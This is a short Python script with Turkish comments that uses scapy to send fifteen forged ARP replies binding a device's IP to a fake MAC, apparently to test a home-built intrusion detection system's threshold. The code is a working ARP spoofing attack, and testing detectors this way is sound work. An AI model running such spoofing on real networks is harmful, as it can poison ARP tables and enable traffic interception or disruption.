from scapy.all import send, ARP
import time

# IDS motorunun az önce kaydettiği gerçek cihazın IP'si
target_ip = "172.20.10.7"

# Saldırganın kullanacağı sahte (fake) MAC adresi
fake_mac = "DE:AD:BE:EF:CA:FE"

print("[*] Saldırı simülasyonu başlatılıyor (Sahte ARP paketleri gönderiliyor)...")

# IDS'in eşik değerini (3 saniyede 10 paket) aşmak için döngüye sokuyoruz
for i in range(15):
    # op=2 (ARP Reply), aynı IP ama farklı MAC adresi ile ağa yalan söylüyoruz
    packet = ARP(op=2, psrc=target_ip, hwsrc=fake_mac, pdst="172.20.10.1")
    send(packet, verbose=False)
    time.sleep(0.1)

print("[+] Simülasyon tamamlandı! IDS terminaline ve veritabanına bak.")